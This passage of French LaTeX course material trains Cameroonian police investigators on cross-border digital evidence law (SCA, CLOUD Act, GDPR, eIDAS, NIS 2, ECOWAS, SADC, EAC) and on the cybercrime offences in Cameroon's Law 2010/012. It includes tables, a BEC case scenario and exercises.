signifie que les données d'un ressortissant camerounais hébergées chez
Google aux États-Unis peuvent être accessibles aux autorités américaines
sans que le Cameroun en soit informé. La souveraineté numérique
camerounaise est directement engagée.

\cro{$\downarrow\downarrow$ tension souveraineté}{$\uparrow$ pour preuves obtenues}{$\uparrow\uparrow$ recov. us-based}

\textbf{Implication pratique~:} pour les OPJ camerounais~--- le CLOUD~Act
joue en leur faveur~: les partenaires américains peuvent obtenir des données
chez des fournisseurs US plus facilement qu'un MLAT classique, et les
partager via accords bilatéraux.
\end{boxCRO}

% ============================================================================
\section{Droit Européen~: RGPD, eIDAS, NIS~2 et e-Evidence}
\label{sec:droit-europe}
% ============================================================================

L'Union Européenne a construit le cadre normatif numérique le plus dense
au monde. Pour un OPJ camerounais coopérant avec des partenaires européens
ou réquisitionnant des fournisseurs basés en Europe, quatre textes sont
directement pertinents.

\subsection{RGPD~: tensions avec l'investigation forensique}

Le \termecle{RGPD}\index{RGPD} (Règlement~(UE)~2016/679) est le texte de
référence mondial sur la protection des données personnelles. Il crée des
tensions structurelles avec la forensique numérique~:

\begin{tableaucours}{p{3.5cm}p{3.5cm}p{4.5cm}}{%
    \tableauHeader{Droit RGPD} &
    \tableauHeader{Tension forensique} &
    \tableauHeader{Résolution}
}
Droit à l'effacement (art.~17) &
    Un suspect peut demander la suppression de ses données chez un
    fournisseur européen --- y compris des preuves potentielles &
    Art.~17(3)(e)~: exception pour \textit{constatation, exercice ou
    défense de droits en justice}~; conservation possible sur injonction \\
Minimisation des données (art.~5) &
    La collecte exhaustive de toutes les données d'un suspect viole le
    principe de minimisation &
    L'investigation judiciaire constitue une base légale distincte
    (art.~6(1)(e)~: mission d'intérêt public) \\
Notification de violation (art.~33) &
    Un fournisseur victime d'une fuite doit notifier sous 72h~---
    ce qui peut alerter le suspect visé &
    Les autorités judiciaires peuvent demander le report de la
    notification (art.~23) si cela entrave l'enquête \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~11.3 --- Tensions RGPD / investigation forensique}\end{center}

\begin{boxjuris}
\textbf{RGPD Article~23 --- Limitations~:}
\begin{quote}
Le droit de l'Union ou le droit d'un État membre \textit{[\ldots]} peut
limiter la portée des obligations \textit{[\ldots]} lorsqu'une telle
limitation respecte l'essence des libertés et droits fondamentaux et qu'elle
constitue une mesure nécessaire et proportionnée dans une société
démocratique pour garantir~: \textit{(d)~la prévention et la détection
d'infractions pénales, ainsi que les enquêtes et les poursuites en la
matière ou l'exécution de sanctions pénales}.
\end{quote}
\textbf{Implication opérationnelle~:} l'article~23 est la base légale
qui permet aux partenaires européens de transmettre des données au
Cameroun malgré le RGPD, dans le cadre d'une coopération judiciaire.
Citer explicitement cet article dans toute demande d'entraide adressée
à un État européen.
\end{boxjuris}

\subsection{eIDAS~: valeur probatoire des signatures et horodatages électroniques}

Le règlement \termecle{eIDAS}\index{eIDAS} (Règlement~(UE)~910/2014,
révisé 2024) établit un cadre pour la confiance numérique en Europe.
Son impact forensique porte sur la valeur probatoire des documents
électroniques provenant d'Europe.

\begin{tableaucours}{p{3.2cm}p{5.5cm}p{3.8cm}}{%
    \tableauHeader{Niveau} &
    \tableauHeader{Description} &
    \tableauHeader{Valeur probatoire}
}
\textbf{Signature simple} &
    Toute donnée électronique liée à un signataire &
    Faible~; contestable \\
\textbf{Signature avancée} &
    Identifie le signataire de manière unique~; liée aux données
    de façon détectable en cas de modification &
    Moyenne~; présomption simple d'authenticité \\
\textbf{Signature qualifiée} &
    Certificat qualifié + dispositif sécurisé certifié QSCD~;
    équivalent légal d'une signature manuscrite &
    \textbf{Maximale}~; présomption irréfragable en droit européen \\
\textbf{Horodatage qualifié} &
    Preuve d'existence d'un document à un instant précis~;
    délivré par une autorité de confiance certifiée &
    \textbf{Force probante maximale} pour la date d'existence \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~11.4 --- Niveaux de signature et valeur probatoire (eIDAS)}\end{center}

\begin{boiteRemarque}{eIDAS et forensique camerounaise}
Quand un partenaire européen transmet des preuves numériques signées avec
une signature qualifiée eIDAS, ces preuves ont une valeur probatoire
maximale en droit européen. Dans un tribunal camerounais, la \loicam{2024/017}
(art.~6~: principe d'intégrité) et les principes généraux du droit de
la preuve permettent de faire reconnaître cette valeur si l'expert
forensique explique le système de certification. Documenter systématiquement
le niveau eIDAS des documents reçus dans le rapport d'analyse.
\end{boiteRemarque}

\subsection{NIS~2~: implications pour la forensique d'incident}

La Directive \termecle{NIS~2}\index{NIS 2} (Directive~(UE)~2022/2555)
impose des obligations de cybersécurité aux opérateurs de secteurs
essentiels dans l'UE. Son impact sur la forensique~:

\begin{itemize}
    \item \textbf{Obligation de notification d'incident}~: les entités
          essentielles doivent notifier l'incident dans les 24h à l'autorité
          nationale compétente, et dans les 72h un rapport initial complet.
          Ces rapports d'incident constituent des preuves documentaires
          exploitables en forensique.
    \item \textbf{Logs conservés}~: NIS~2 impose la conservation de logs
          de sécurité pendant une durée suffisante pour permettre les
          investigations post-incident. Pour l'OPJ coopérant avec un
          partenaire UE~: ces logs existent, ils sont conservés, ils peuvent
          être requis.
    \item \textbf{Incident Response Plans}~: les entités NIS~2 sont tenues
          de maintenir des procédures de réponse aux incidents documentées.
          La conformité NIS~2 d'un partenaire est une garantie de qualité
          probatoire de ses données.
\end{itemize}

\subsection{Règlement e-Evidence~: la révolution en cours}

Le Règlement~(UE)~2023/1543 (\termecle{e-Evidence}), applicable depuis
2026, crée un mécanisme direct pour l'obtention de preuves électroniques
entre les États membres de l'UE~:

\begin{itemize}
    \item \textbf{European Production Order}~: les autorités judiciaires
          d'un État membre peuvent directement requérir un fournisseur
          établi dans un autre État membre~; délai cible~: 10~jours
          (6h en urgence).
    \item \textbf{Impact pour le Cameroun}~: les délais de coopération
          intra-UE se raccourcissent drastiquement~; les partenaires
          européens du Cameroun peuvent obtenir des données pan-européennes
          bien plus vite, et les partager ensuite dans le cadre d'un MLAT.
\end{itemize}

% ============================================================================
\section{Droit Africain Régional~: CEDEAO, SADC et EAC}
\label{sec:droit-afrique}
% ============================================================================

\subsection{CEDEAO~: le cadre d'Afrique de l'Ouest}

La \termecle{CEDEAO}\index{CEDEAO} (\textit{Communauté Économique des États
de l'Afrique de l'Ouest}) a adopté deux textes harmonisant le droit numérique
de ses 15~membres~:

\begin{tableaucours}{p{4.0cm}p{7.5cm}}{%
    \tableauHeader{Texte} &
    \tableauHeader{Contenu et pertinence forensique}
}
\textbf{Directive C/DIR/1/08/11} sur la cybercriminalité &
    Harmonise les infractions cyberpénales~: accès illicite,
    interception, atteinte à l'intégrité. Infractions similaires
    à Budapest. \textbf{Pertinence~:} base pour demandes de coopération
    vers les membres CEDEAO (Sénégal, Ghana, Nigeria~: membres). \\
\textbf{Acte additionnel A/SA.2/01/10} sur les données personnelles &
    Définit les principes de protection des données pour les États
    membres. Influence les réponses aux réquisitions de données de
    citoyens des États membres. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~11.5 --- Textes CEDEAO pertinents pour la forensique}\end{center}

\begin{boiteRemarque}{CEDEAO et coopération avec le Nigeria et le Sénégal}
Le Nigeria et le Sénégal (deux États membres CEDEAO ayant également
ratifié Budapest) constituent les partenaires les plus sollicités par
les OPJ camerounais dans les affaires transfrontalières. La CEDEAO ajoute
une couche de coopération régionale~: des demandes peuvent être acheminées
via le mécanisme CEDEAO \emph{en plus} du canal INTERPOL, augmentant les
chances d'obtenir une réponse rapide.
\end{boiteRemarque}

\subsection{SADC~: le modèle d'Afrique Australe}

La \termecle{SADC}\index{SADC} (\textit{Southern African Development
Community}) a développé une \textit{Model Law on Computer Crime and
Cybercrime} servant de référence pour l'harmonisation législative de ses
16~membres (Zimbabwe, Zambie, Mozambique, Afrique du Sud~\ldots).

Points clés de la \textit{Model Law}~:
\begin{itemize}
    \item Criminalisation cohérente avec Budapest des accès illicites,
          interceptions, atteintes à l'intégrité.
    \item Dispositions spécifiques sur la cyberfraude et les atteintes
          aux données financières~: pertinent pour les fraudes bancaires
          transfrontalières Cameroun-Afrique du Sud.
    \item L'Afrique du Sud (\textit{Cybercrimes Act} 2020) est le système
          le plus abouti de la région~: laboratoire forensique national,
          unité cybercrime SAPS, coopération INTERPOL établie.
\end{itemize}

\subsection{EAC~: le cadre d'Afrique de l'Est}

La \termecle{EAC}\index{EAC} (\textit{East African Community}) a développé
un \textit{Framework for Cyberlaws} couvrant les membres~: Kenya, Tanzanie,
Ouganda, Rwanda, Burundi, Sud-Soudan.

Pour les OPJ camerounais, les deux points de contact pertinents sont~:
\begin{itemize}
    \item \textbf{Rwanda}~: l'un des cadres les plus avancés d'Afrique
          sub-saharienne~; \textit{Computer Crime Law} 2020, Autorité
          nationale de cybersécurité (NCSA) opérationnelle.
    \item \textbf{Kenya}~: \textit{Computer Misuse and Cybercrimes Act}
          2018~; coopération INTERPOL active~; hub financier
          (M-Pesa)~: réquisitions sur les fraudes mobile money
          régionales aboutissent bien.
\end{itemize}

% ============================================================================
\section{Grille de Lecture Comparative~: Choisir sa Stratégie Juridique}
\label{sec:grille-comparative}
% ============================================================================

\subsection{Tableau synthétique~: droit local et implications opérationnelles}

\begin{tableaucours}{p{2.5cm}p{2.8cm}p{3.0cm}p{3.5cm}}{%
    \tableauHeader{Juridiction} &
    \tableauHeader{Texte-clé} &
    \tableauHeader{Spécificité forensique} &
    \tableauHeader{Canal recommandé}
}
\textbf{USA} & SCA + CLOUD~Act &
    Contenu emails~: mandat obligatoire. Métadonnées~: portail LEA. &
    Portail LEA (métadonnées)~; MLAT USA (contenu)~;
    Protocole~II Budapest si disponible \\
\textbf{UE} & RGPD + e-Evidence &
    Art.~23 RGPD~: exception judiciaire. e-Evidence~: 10~jours. &
    MLAT bilatéral~; e-Evidence (intra-UE)~;
    citer art.~23 RGPD explicitement \\
\textbf{Afrique West} & CEDEAO Directive &
    Harmonisation avec Budapest. Sénégal/Ghana/Nigeria~: Budapest. &
    INTERPOL réseau 24/7~; canal CEDEAO en complément \\
\textbf{Afrique Sud} & Malabo~; SADC Model Law &
    Rwanda/Kenya~: lois modernes. AfSud~: coopération établie. &
    INTERPOL~; AFRIPOL~; accords bilatéraux \\
\textbf{Russie / Chine} & (pas Budapest, pas Malabo) &
    Coopération très limitée. Chercher les nœuds intermédiaires. &
    Identifier les segments du chemin dans des États coopérants~;
    OSINT sur les nœuds accessibles \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~11.6 --- Grille comparative~: droit local et stratégie}\end{center}

\subsection{Processus de qualification d'une affaire transfrontalière}

Face à une affaire impliquant un élément étranger, la démarche en
cinq étapes~:

\begin{enumerate}
    \item \textbf{Identifier les éléments étrangers}~: où est le serveur~?
          Où est le suspect~? Où est hébergé le fournisseur~? Où ont transité
          les fonds~?
    \item \textbf{Cartographier les droits locaux applicables}~: pour chaque
          État impliqué, quel texte encadre la coopération~? Budapest,
          Malabo, CEDEAO, accord bilatéral, ou rien~?
    \item \textbf{Qualifier l'infraction en double incrimination}~: montrer
          que les faits constituent une infraction dans les deux pays. Sans
          double incrimination, la coopération peut être refusée.
    \item \textbf{Prioriser~: données volatiles d'abord}~: activer
          immédiatement la conservation (art.~29 Budapest, portail LEA).
          Le droit local du partenaire ne change rien à cette priorité.
    \item \textbf{Choisir le canal adapté}~: MLAT formel si contenu
          requis~; portail LEA si métadonnées suffisent~; INTERPOL 24/7
          si urgence.
\end{enumerate}

\begin{boxscenario}{Affaire BEC Cameroun-UE-USA --- stratégie juridique}
\textbf{Faits~:} SONATRAV SA, Douala, perd 85~millions FCFA dans une
attaque BEC. L'email frauduleux a été envoyé depuis une adresse Gmail
(\texttt{@gmail.com}), via un VPN hébergé en Allemagne. Les fonds ont
transité vers un compte Revolut (UE) puis vers Binance (Caïmans).

\textbf{Cartographie juridique~:}
\begin{itemize}
    \item Gmail~$\to$ \textbf{Google USA}~: SCA~; métadonnées via portail
          LEA~; contenu MLAT USA~; base~: CFAA~\S~1030 (fraude via
          ordinateur protégé) + Loi~2010/012 art.~78.
    \item VPN Allemagne~$\to$ \textbf{droit allemand + RGPD}~: MLAT
          franco-camerounais indirect (via UE)~; citer art.~23 RGPD~;
          e-Evidence~\S~si partenaire UE impliqué.
    \item Revolut (Lituanie/UE)~$\to$ \textbf{RGPD + e-Evidence}~:
          European Production Order~; délai~10~jours.
    \item Binance~$\to$ identifier la juridiction réelle~; analyse
          blockchain Blockchair~; portail LEA Binance si disponible.
\end{itemize}

\textbf{Séquence d'actions~:}
\begin{enumerate}
    \item Conservation urgente simultanée~: portail LEA Google (urgence)
          + BCN INTERPOL pour VPN Allemagne (art.~29 Budapest).
    \item Analyse blockchain Binance~: tracer les fonds (OSINT légal).
    \item MLAT USA pour contenu Gmail dans les 60~jours.
    \item Demande e-Evidence à Revolut Lituanie.
\end{enumerate}
\end{boxscenario}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Droit USA}~: SCA impose un \emph{mandat} pour le contenu
          des communications~; les métadonnées s'obtiennent via portail LEA.
          CLOUD~Act~: les entreprises US peuvent livrer des données stockées
          n'importe où. CFAA~: base pour la double incrimination.

    \item \textbf{RGPD européen}~: tension structurelle avec la forensique,
          résolue par l'art.~23 (exception judiciaire) et l'art.~6(1)(e)
          (mission d'intérêt public). Citer explicitement ces articles
          dans toute demande à un partenaire européen.

    \item \textbf{eIDAS}~: trois niveaux de signature~; la signature
          qualifiée a valeur légale maximale~; l'horodatage qualifié
          prouve l'existence à un instant~; documenter le niveau eIDAS
          des preuves reçues d'Europe.

    \item \textbf{NIS~2}~: impose la conservation de logs et la
          notification d'incidents~; les entités conformes constituent
          des sources de preuves documentaires de qualité.

    \item \textbf{Afrique régionale}~: CEDEAO renforce les demandes vers
          Sénégal/Ghana/Nigeria~; SADC couvre l'Afrique australe (Afrique
          du Sud~: meilleur partenaire forensique)~; EAC couvre
          Rwanda/Kenya (lois modernes, coopération active).

    \item \textbf{Double incrimination}~: condition nécessaire dans la
          plupart des coopérations~; montrer que les faits constituent une
          infraction chez les deux partenaires. Loi~2010/012 +
          CFAA/RGPD-infraction/Budapest = base solide.

    \item \textbf{Grille de décision en 5 étapes}~: identifier les
          éléments étrangers~$\to$ cartographier les droits~$\to$ double
          incrimination~$\to$ conservation d'abord~$\to$ canal adapté.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~11.1 --- Identification du cadre légal \niveaubase}]
Pour chacune des situations suivantes, identifiez~: (A)~le ou les textes
légaux applicables chez le partenaire étranger, (B)~l'instrument requis
pour obtenir les données demandées, (C)~le délai réaliste~:
\begin{enumerate}[(a)]
    \item Vous souhaitez obtenir les données d'abonné d'un compte Gmail
          suspect (\texttt{@gmail.com}) utilisé dans une fraude MoMo.
    \item Vous devez obtenir le contenu des emails Outlook d'un suspect
          hébergés par Microsoft USA dans le cadre d'une escroquerie.
    \item Un serveur Apache hébergé en France a servi à déposer un malware.
          Vous demandez les logs d'accès au fournisseur d'hébergement.
    \item Un compte Facebook utilisé pour harcèlement identifie son
          propriétaire au Sénégal. Vous demandez les données d'abonné.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~11.2 --- Tensions RGPD \niveaumoyen}]
Un fournisseur d'hébergement allemand vous informe qu'il ne peut pas
répondre à votre réquisition en raison du RGPD et du principe de
minimisation des données~:
\begin{enumerate}[(a)]
    \item Quel article du RGPD invoqueriez-vous pour contester ce refus~?
          Rédigez le paragraphe de réponse à inclure dans votre demande.
    \item Quelle condition doit être remplie pour que l'exception judiciaire
          de l'art.~23 RGPD soit valablement invoquée~?
    \item Si le fournisseur maintient son refus, par quel canal alternatif
          pouvez-vous obtenir les données~?
    \item Appliquez la grille CRO à la décision d'invoquer l'art.~23
          ou de passer directement au MLAT.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~11.3 --- Stratégie juridique complète \niveauexpert}]
Dans l'Opération WOURI (Chapitre~\ref{chap:gr-affaires}), l'analyse
révèle que l'attaque BEC implique~:
\begin{itemize}
    \item Email phishing envoyé depuis un compte Outlook~(\texttt{@hotmail.fr})
          hébergé en Irlande (centre de données Microsoft Europe)~;
    \item VPN utilisé~: NordVPN (siège social~: Panama, serveurs
          aux Pays-Bas)~;
    \item Compte bancaire destinataire~: HSBC Hong Kong~;
    \item Fonds convertis en BTC et envoyés vers une adresse dont la
          dernière transaction pointe vers un exchange turc (Paribu).
\end{itemize}
\begin{enumerate}[(a)]
    \item Pour chaque élément, identifiez le cadre légal applicable et
          l'instrument de coopération optimal.
    \item La double incrimination est-elle satisfaite dans chaque cas~?
          Justifiez en citant les textes de loi des deux pays.
    \item Rédigez le plan d'action chronologique complet~: dans quel
          ordre agir, par quel canal, dans quel délai, et quel résultat
          attendre à chaque étape.
    \item Quel élément de cette chaîne est le plus vulnérable à un
          refus de coopération~? Proposez une stratégie de contournement.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le Chapitre~\ref{chap:droit-cam} approfondit le
\textbf{droit camerounais du numérique}~: architecture complète de
la \loicam{2010/012} et de la \loicam{2024/017}, jurisprudence naissante,
rôle de l'ANTIC, articulation avec le Code pénal et le Code de procédure
pénale. Ce chapitre sera le plus important pour la rédaction des
procès-verbaux et la qualification des infractions devant les tribunaux
camerounais.
\end{boxinfo}

       
        % ============================================================================
% Fichier  : partie3/P03_C12_droit_camerounais_africain.tex
% Titre    : Droit Camerounais et Africain
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : M3_Cadre_Normatif_National_PNC.docx (intégral -- textes articles,
%            tableaux sanctions, règles articulation, simulation MOABI)
%            14_droit_camerounais_africain.tex (squelette 98 lignes)
%            Prologue (affaire MBONGO), Ch. custody (art. 52-59)
% Positionnement : Ce chapitre est le plus important du cours pour la pratique
%                  quotidienne des OPJ camerounais : qualification correcte,
%                  rédaction de PV, transmissibilité au parquet.
%                  Le M3 PNC est la source principale -- fidèlement transposé.
% ============================================================================

\chapter{Droit Camerounais et Africain}
\label{chap:droit-cam}

\epigraph{%
    « Africa must develop its own digital legal framework that respects
    both international standards and local cultural realities. »%
}{--- Nnenna Ifeanyi-Ajufo}

\niveauChapitre{Fondamental}{%
    Notions de droit général recommandées mais non indispensables~:
    ce chapitre part de zéro sur le droit camerounais du numérique.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Identifier les trois textes du cadre normatif national et
          leur articulation~: \loicam{2010/012}, \loicam{2024/017},
          Code pénal.
    \item Qualifier les infractions numériques les plus fréquentes
          au Cameroun (fraude, accès illicite, ransomware, CSAM) selon
          l'article de loi exact.
    \item Appliquer la \loicam{2024/017} aux violations de données
          personnelles et identifier les sanctions applicables.
    \item Maîtriser les règles d'articulation des trois textes~:
          quand cumuler, quand choisir.
    \item Identifier les six erreurs de qualification les plus fréquentes
          et leurs conséquences sur la validité du dossier judiciaire.
    \item Rédiger un rapport de qualification d'infraction numérique
          transmissible au parquet.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Ce chapitre dans la pratique quotidienne}
% ============================================================================

Un OPJ qui ne maîtrise pas les qualifications nationales sera incapable
de rédiger un procès-verbal valable, de choisir le bon article d'inculpation
et de préparer un dossier transmissible au parquet. Les droits internationaux
des chapitres précédents sont inutilisables sans cette fondation nationale.

\textbf{Méthode de ce chapitre~:} partir systématiquement de cas concrets
camerounais~--- fraudes MoMo, escroqueries Facebook, SIM~swapping, ransomware~---
et remonter vers la qualification légale. Jamais l'inverse.

\separateur

% ============================================================================
\section{Architecture du Cadre Normatif National~: Trois Textes}
\label{sec:architecture-nationale}
% ============================================================================

\subsection{Vue d'ensemble}

Trois textes constituent le droit camerounais du numérique~:

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Texte} &
    \tableauHeader{Objet} &
    \tableauHeader{Rôle pour l'enquêteur}
}
\textbf{\loicam{2010/012}} du 21~déc.~2010 &
    Cybersécurité et cybercriminalité &
    \textbf{Texte principal de qualification pénale.}
    97~articles, 5~titres, 73~définitions. \\
\textbf{\loicam{2024/017}} du 23~déc.~2024 &
    Protection des données à caractère personnel &
    Complète la Loi~2010 pour les violations de données.
    Sanctions administratives ET pénales. \\
\textbf{Code pénal camerounais} &
    Droit pénal général &
    S'applique en cumul pour l'escroquerie, le faux,
    la diffamation, les menaces. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~12.1 --- Les trois textes du cadre national}\end{center}

\begin{boxalert}
\textbf{Quatre points clés avant de qualifier~:}
\begin{enumerate}
    \item L'article~4 de la Loi~2010/012 définit \textbf{73~termes}. Ces
          définitions ont valeur juridique contraignante. Une qualification
          fondée sur une définition incorrecte fragilise le dossier.
    \item La Loi~2010 n'abroge pas le Code pénal. \textbf{Les deux se cumulent.}
          Un même fait peut être à la fois escroquerie (CP) et fraude
          informatique (art.~72 Loi~2010).
    \item \textbf{Art.~89 Loi~2010~: le sursis est impossible.} Tout condamné
          sous la Loi~2010 purge sa peine. Mentionner ce point dans
          chaque rapport transmis au parquet.
    \item Le champ d'application est large~: réseaux + systèmes d'information
          + équipements terminaux. \textbf{Un téléphone mobile est un
          équipement terminal. Un groupe WhatsApp est un réseau de
          communications électroniques.}
\end{enumerate}
\end{boxalert}

\subsection{Architecture de la Loi~2010/012}

\begin{tableaucours}{p{3.5cm}p{8.0cm}}{%
    \tableauHeader{Titre} &
    \tableauHeader{Contenu et articles clés}
}
\textbf{Titre~I} --- Dispositions générales &
    Définitions (art.~4 --- 73~termes).
    Champ d'application. Exclusion défense/sécurité nationale (art.~2). \\
\textbf{Titre~II} --- Cybersécurité &
    Politique de sécurité (art.~6). Régulation ANTIC (art.~7--9).
    Certification et signature électronique (art.~10--23).
    Protection des réseaux et vie privée (art.~24--51). \\
\textbf{Titre~III} --- Cybercriminalité &
    \textbf{Dispositions processuelles (art.~52--59)~: perquisitions,
    saisies, réquisitions.}
    \textbf{Infractions et sanctions (art.~60--89)~: toutes les
    qualifications pénales.} \\
\textbf{Titre~IV} --- Coopération judiciaire &
    Entraide judiciaire internationale (art.~91--94). \\
\textbf{Titre~V} --- Dispositions finales &
    Textes d'application (art.~95--97). \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~12.2 --- Architecture de la Loi~2010/012}\end{center}

% ============================================================================
\section{Les Infractions de la Loi~2010/012~: Titre~III}
\label{sec:infractions-loi2010}
% ============================================================================

\subsection{Articles~65 à~69~: accès, interception, atteinte à l'intégrité}

\begin{boxjuris}
\textbf{Article~65 --- Accès illicite et interception illégale~:}
\begin{quote}
(1)~Est puni d'un emprisonnement de cinq~(05) à dix~(10)~ans et d'une
amende de 5~000~000 à 10~000~000~F~CFA \textit{[\ldots]} celui qui effectue,
sans droit ni autorisation, l'interception par des moyens techniques, de
données lors des transmissions \textit{[\ldots]} à destination, en provenance
ou à l'intérieur ou non d'un réseau de communications électroniques.

(2)~Est puni des mêmes peines tout accès non autorisé à l'ensemble ou à
une partie d'un réseau de communications électroniques ou d'un système
d'information ou d'un équipement terminal.

(3)~Les peines prévues à l'alinéa~1 ci-dessus sont doublées, en cas
d'accès illicite portant atteinte à l'intégrité, la confidentialité,
la disponibilité du réseau ou du système d'information.

(4)~Est puni des mêmes peines celui qui, sans droit, permet l'accès dans
un réseau ou dans un système d'information par défi intellectuel.
\end{quote}
\textbf{L'article fondamental.} Toute intrusion informatique non autorisée
tombe sous cet article --- qu'elle ait causé un dommage ou non. L'argument
de la ``simple curiosité'' ne constitue pas une défense~: l'al.~4 le
criminalise explicitement.\\[0.3ex]
\textbf{Circonstance aggravante (al.~3)~:} peines doublées si l'accès porte
atteinte à l'intégrité, la confidentialité ou la disponibilité.
En pratique~: toute intrusion qui modifie, copie ou rend inaccessibles
des données tombe dans l'aggravation.\\[0.3ex]
\textbf{Cas type PNC~:} accès au compte bancaire en ligne d'un tiers en
utilisant ses identifiants volés~$\to$ art.~65~al.~2 + art.~65~al.~3
(données copiées).
\end{boxjuris}

\begin{boxjuris}
\textbf{Articles~66--67 --- Atteinte à l'intégrité des réseaux et systèmes~:}
Art.~66~al.~1~: puni de 2 à 5~ans + 1~000~000 à 2~000~000~F~CFA, celui
qui entraîne la perturbation ou l'interruption du fonctionnement d'un
réseau en introduisant, transmettant, endommageant, effaçant, détériorant,
modifiant, supprimant ou rendant inaccessibles les données.\\[0.3ex]
\textbf{Distinction art.~66 vs art.~67~:} art.~66~= perturbation d'un réseau
ou équipement terminal~; art.~67~= atteinte à l'intégrité d'un
système d'information. Les deux peuvent être cumulés.\\[0.3ex]
\textbf{Couverture pratique~:} attaques DDoS (saturation~= perturbation)~;
ransomware (chiffrement~= rendre inaccessibles)~; defacement de site web
(modification~= art.~67)~; sabotage de base de données.
\end{boxjuris}

\begin{boxjuris}
\textbf{Articles~68--69 --- Accès aggravé et espionnage informatique~:}
Art.~68~: puni de 5 à 10~ans + 10~M à 50~M~F~CFA celui qui accède ou
se maintient frauduleusement dans un système en causant une perturbation.
\textbf{Peines doublées si suppression ou modification de données
(art.~68~al.~2).}\\[0.3ex]
Art.~69~: accès en violation des mesures de sécurité pour obtenir des
données d'un système interconnecté. Amende plafond~: \textbf{100~millions
FCFA.}\\[0.3ex]
\textbf{Cas type art.~69~:} intrusion dans le système de paie d'une
administration camerounaise depuis Internet pour extraire des données
salariales.
\end{boxjuris}

\subsection{Articles~70 à~72 et~86~: fraude, manipulation, abus de dispositifs}

\begin{boxjuris}
\textbf{Article~72 --- Fraude informatique~:}
Est puni des peines de l'art.~66 celui qui, de quelque manière que ce
soit, sans droit, introduit, altère, efface ou supprime, \textbf{afin
d'obtenir un bénéfice économique}, les données électroniques, de manière
à causer un préjudice patrimonial à autrui.\\[0.3ex]
\textbf{Trois éléments constitutifs~:} (1)~acte sur des données
(introduction, altération, effacement, suppression), (2)~sans droit,
(3)~pour obtenir un bénéfice économique causant un préjudice patrimonial.\\[0.3ex]
\textbf{L'article le plus utilisé pour les escroqueries en ligne.}
BEC, phishing bancaire, fraude MoMo, modification de relevés bancaires~---
tous tombent sous art.~72.\\[0.3ex]
\textbf{Cumul recommandé~:} art.~72 Loi~2010 + art.~318 Code pénal
(escroquerie) quand la victime a été manipulée ET que des données
ont été altérées.
\end{boxjuris}

\begin{boxjuris}
\textbf{Article~86 --- Abus de dispositifs informatiques~:}
Est puni d'un emprisonnement de 2 à 5~ans \textit{[\ldots]} celui qui
importe, détient, offre, cède, vend ou met à disposition un programme
informatique, un mot de passe, un code d'accès ou toutes données
informatiques similaires conçus et/ou spécialement adaptés pour permettre
d'accéder à un système d'information.\\[0.3ex]
\textbf{Criminalise la préparation~:} vendre un kit de phishing, partager
des identifiants volés, mettre à disposition un logiciel d'intrusion~---
même sans attaque effective.\\[0.3ex]
\textbf{Peines accessoires (art.~87)~:} confiscation des outils~;
interdiction d'exercer une activité professionnelle (5~ans)~;
fermeture d'établissement~; exclusion des marchés publics.
\end{boxjuris}

\subsection{Article~88~: refus de remettre la clé de déchiffrement}

\begin{boxjuris}
\textbf{Article~88 --- Refus de déchiffrement~:}
(1)~Est puni d'un emprisonnement de \textbf{un~(01) à cinq~(05)~ans} et
d'une amende de \textbf{100~000 à 1~000~000~F~CFA} celui qui refuse de
remettre aux autorités judiciaires compétentes la convention secrète de
déchiffrement d'un moyen cryptologique susceptible d'avoir été utilisé
pour préparer ou commettre une infraction.

(2)~Les peines prévues à l'alinéa~1 sont portées de 3 à 5~ans et de
1~000~000 à 5~000~000~F~CFA lorsque la remise de ladite convention aurait
permis d'éviter un crime ou délit ou d'en limiter les effets.
\end{boxjuris}

\begin{boxPNC}
\textbf{L'article 88~: réflexe obligatoire face à un téléphone chiffré}

Un suspect refuse de déverrouiller son téléphone. L'OPJ ne doit pas bloquer~:
\begin{enumerate}
    \item Obtenir une réquisition formelle du procureur ou du juge
          d'instruction (la réquisition est la condition préalable).
    \item Si le suspect refuse après réquisition~: art.~88~al.~1
          constitue une infraction autonome \emph{indépendante} de
          l'infraction principale.
    \item Si des éléments montrent que le déchiffrement aurait permis
          d'éviter un crime en cours~: art.~88~al.~2 (aggravé~: 3--5~ans).
    \item Documenter précisément~: date et heure de la réquisition,
          formulation exacte de la demande, refus exprimé clairement.
\end{enumerate}
\textbf{Erreur fréquente~:} beaucoup d'enquêteurs ignorent l'existence
de cet article. Un dossier CSAM ou ransomware peut être débloqué par
la seule citation de l'art.~88.
\end{boxPNC}

\subsection{Article~76~: CSAM et contenus sexuels impliquant des mineurs}

\begin{boxjuris}
\textbf{Article~76 --- Pornographie enfantine~:}
Est puni d'un emprisonnement de \textbf{cinq~(05) à dix~(10)~ans} et
d'une amende de \textbf{5~000~000 à 10~000~000~F~CFA} celui qui fixe,
enregistre, transmet ou diffuse, via un système d'information ou un
réseau de communications électroniques, des images pornographiques
impliquant des mineurs.\\[0.3ex]
\textbf{Ressource opérationnelle clé~:} NCMEC CyberTipline
(\texttt{cybertipline.org}). Les fournisseurs américains ont l'obligation
légale de signaler tout CSAM détecté~; les signalements sont transmis
via INTERPOL.\\[0.3ex]
\textbf{Cumul obligatoire~:} art.~76 Loi~2010 + art.~295 Code pénal
(attentat à la pudeur aggravé) + art.~80--81 Loi~2010 si proposition
sexuelle en ligne à un mineur.
\end{boxjuris}

% ============================================================================
\section{La Loi~2024/017~: Protection des Données Personnelles}
\label{sec:loi2024}
% ============================================================================

\subsection{Architecture et innovations par rapport à la Loi~2010}

